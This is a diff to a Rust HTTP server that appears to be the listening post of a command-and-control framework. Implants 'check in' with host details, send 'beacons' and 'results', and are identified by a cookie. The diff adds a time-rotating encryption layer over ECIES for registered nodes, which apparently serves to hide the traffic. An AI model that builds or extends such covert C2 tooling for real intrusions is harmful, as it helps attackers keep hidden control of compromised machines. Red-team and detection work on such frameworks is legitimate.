@@ -1,20 +1,26 @@
+use std::collections::HashMap;
 use std::io::Read;
+use std::sync::Mutex;
 
 use base64::engine::general_purpose::URL_SAFE_NO_PAD as BASE64;
 use base64::Engine;
 
-use glimmer::crypto;
+use glimmer::crypto::{self, TimeBasedKey};
 use glimmer::keystore::KeyStore;
 use glimmer::proto::{Envelope, MsgType};
 
 struct Server {
     keystore: KeyStore,
+    nodes: Mutex<HashMap<String, TimeBasedKey>>,
 }
 
 impl Server {
     fn new() -> Self {
         let keystore = KeyStore::load("keys").expect("failed to load keystore");
-        Server { keystore }
+        Server {
+            keystore,
+            nodes: Mutex::new(HashMap::new()),
+        }
     }
 }
 
@@ -53,8 +59,6 @@ fn handle_connection(
     let (_headers, body) = read_http_body(&mut stream)?;
     let body = body.trim();
 
-    glimmer::dbg_log!("headers: {:?}", _headers);
-
     if body.len() < 8 {
         return Err("body too short".into());
     }
@@ -68,71 +72,107 @@ fn handle_connection(
 
     let decoded = BASE64.decode(payload_b64)?;
 
+    let node_id_hint = extract_node_id(&_headers);
+
     // Look up server keypair by key_id
     let keypair = server
         .keystore
         .get(&key_id_bytes)
         .ok_or_else(|| format!("unknown key_id: {}", key_id_hex))?;
 
-    // Every message starts with 33-byte ephemeral pubkey
-    // Check if there's a second 33-byte response pubkey
-    let has_response_key = decoded.len() > 66
-        && (decoded[0] == 0x02 || decoded[0] == 0x03)
-        && (decoded[33] == 0x02 || decoded[33] == 0x03);
+    // Try time-based + ECIES layered decryption for known nodes
+    if let Some(ref nid) = node_id_hint {
+        let nodes = server.nodes.lock().unwrap_or_else(|e| e.into_inner());
+        if let Some(tbk) = nodes.get(nid.as_str()) {
+            // Outer layer: time-based
+            if let Ok(inner) = tbk.decrypt_with_skew(&decoded, 2) {
+                // Inner layer: ECIES
+                if let Ok(plaintext) = crypto::decrypt_from_beacon(&inner, keypair) {
+                    let envelope = Envelope::unmarshal(&plaintext)?;
+                    let ts = format_ts(envelope.timestamp);
 
-    let (plaintext, response_pub) = if has_response_key {
-        let (plain, resp_pub) = crypto::decrypt_from_beacon_with_response(&decoded, keypair)?;
-        (plain, Some(resp_pub))
-    } else {
-        let plain = crypto::decrypt_from_beacon(&decoded, keypair)?;
-        (plain, None)
-    };
+                    match envelope.msg_type {
+                        MsgType::Beacon => {
+                            eprintln!(
+                                "[beacon] {} node={} key_id={} [layered]",
+                                ts, envelope.node_id, key_id_hex
+                            );
+                        }
+                        MsgType::Result => {
+                            eprintln!(
+                                "[result] {} node={} payload={} bytes [layered]",
+                                ts, envelope.node_id,
+                                envelope.payload.as_ref().map(|p| p.len()).unwrap_or(0),
+                            );
+                        }
+                        _ => {
+                            eprintln!(
+                                "[msg] {} node={} type={:?} [layered]",
+                                ts, envelope.node_id, envelope.msg_type
+                            );
+                        }
+                    }
 
-    let envelope = Envelope::unmarshal(&plaintext)?;
-    let ts = chrono::DateTime::from_timestamp(envelope.timestamp, 0)
-        .map(|t| t.format("%H:%M:%S").to_string())
-        .unwrap_or_else(|| "???".into());
-
-    match envelope.msg_type {
-        MsgType::Checkin => {
-            if let Some(payload) = &envelope.payload {
-                let checkin: glimmer::proto::CheckinData = serde_json::from_slice(payload)?;
-                eprintln!(
-                    "[checkin] {} node={} os={}/{} host={} pid={} key_id={} [ephemeral ECDH]",
-                    ts,
-                    envelope.node_id,
-                    checkin.os,
-                    checkin.arch,
-                    checkin.host,
-                    checkin.pid,
-                    key_id_hex,
-                );
+                    let response = "HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n";
+                    std::io::Write::write_all(&mut stream, response.as_bytes())?;
+                    return Ok(());
+                }
             }
-        }
-        MsgType::Beacon => {
-            eprintln!("[beacon] {} node={} key_id={}", ts, envelope.node_id, key_id_hex);
-        }
-        MsgType::Result => {
-            eprintln!(
-                "[result] {} node={} payload={} bytes",
-                ts,
-                envelope.node_id,
-                envelope.payload.as_ref().map(|p| p.len()).unwrap_or(0),
-            );
         }
     }
 
-    // Send response
-    let response = if response_pub.is_some() {
-        // TODO: encrypt actual tasking here
-        "HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n".to_string()
-    } else {
-        "HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n".to_string()
-    };
+    // Not a known node - try as bootstrap checkin
+    let (plaintext, _response_pub, root_secret) =
+        crypto::bootstrap_decrypt(&decoded, keypair)?;
 
+    let envelope = Envelope::unmarshal(&plaintext)?;
+    let ts = format_ts(envelope.timestamp);
+
+    if let MsgType::Checkin = envelope.msg_type {
+        if let Some(payload) = &envelope.payload {
+            let checkin: glimmer::proto::CheckinData = serde_json::from_slice(payload)?;
+            eprintln!(
+                "[checkin] {} node={} os={}/{} host={} pid={} key_id={} [bootstrap]",
+                ts,
+                envelope.node_id,
+                checkin.os,
+                checkin.arch,
+                checkin.host,
+                checkin.pid,
+                key_id_hex,
+            );
+
+            let tbk = TimeBasedKey::new(root_secret, 300);
+            let mut nodes = server.nodes.lock().unwrap_or_else(|e| e.into_inner());
+            nodes.insert(envelope.node_id.clone(), tbk);
+            eprintln!("[server] time-based key established for node={}", envelope.node_id);
+        }
+    }
+
+    let response = "HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n";
     std::io::Write::write_all(&mut stream, response.as_bytes())?;
 
     Ok(())
+}
+
+fn format_ts(timestamp: i64) -> String {
+    chrono::DateTime::from_timestamp(timestamp, 0)
+        .map(|t| t.format("%H:%M:%S").to_string())
+        .unwrap_or_else(|| "???".into())
+}
+
+fn extract_node_id(headers: &str) -> Option<String> {
+    headers
+        .lines()
+        .find(|line| line.to_lowercase().starts_with("cookie:"))
+        .and_then(|line| {
+            let cookies = line.splitn(2, ':').nth(1)?.trim();
+            cookies
+                .split(';')
+                .map(|c| c.trim())
+                .find(|c| c.starts_with("sid="))
+                .map(|c| c.trim_start_matches("sid=").to_string())
+        })
 }
 
 fn read_http_body(
